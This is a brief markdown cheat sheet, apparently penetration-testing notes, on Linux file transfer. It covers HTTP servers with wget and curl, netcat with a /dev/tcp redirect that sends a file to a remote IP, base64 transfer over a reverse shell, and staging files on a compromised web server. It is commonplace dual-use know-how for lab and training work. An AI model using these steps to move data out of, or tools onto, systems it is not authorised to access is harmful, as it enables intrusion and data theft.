# Linux File Transfer Methods

## HTTP
### Source Machine
```
python3 -m http.server [PORT]
```
```
python -m SimpleHTTPServer [PORT]
```
```
php -S $[IP]:[PORT]
````
### Destination Machine
#### Wget
```
wget [URL] -O [OUTPUT FILE]
```
#### cURL
```
curl -o [OUTPUT FILE] [URL]
```
## Netcat
### Source Machine
```
nc -nvlp [PORT] > [OUTPUT FILE]
```
### Destination Machine
```
cat [FILE NAME] > /dev/tcp/[IP]/[PORT]
```
## Reverse Shell
### Source Machine (Copy Result)
```
cat [FILE] | base64 -w 0; echo
```
### Destination Machine
```
echo [CLIPBOARD] | base64 -d > [OUTPUT FILE]
```
## Web Server Compromise
### Source Machine (Web Server)
Move the file into the location where the webserver is hosting the files.
Example
```
mv [FILE] /var/www/
```
### Destination Machine
Navigate to the website and the directory with the same name as the file.
Example
```
http://[IP]/[FILE]
```
